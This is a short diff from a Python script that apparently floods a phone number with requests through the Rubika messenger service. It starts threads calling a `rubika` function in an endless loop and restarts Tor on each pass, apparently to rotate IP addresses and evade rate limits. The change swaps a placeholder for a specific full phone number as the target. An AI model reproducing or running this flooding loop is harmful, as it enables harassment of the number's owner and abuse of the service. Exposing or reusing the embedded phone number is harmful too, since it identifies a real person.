@@ -77,7 +77,7 @@ def main():
              *******************************************
 #666
              
- Number>> (+98xxxxxxx): """))
+ Number>> (+989377699698): """))
     while True:
         Thread(target=rubika, args=[phone]).start()
         os.system("killall -HUP tor")
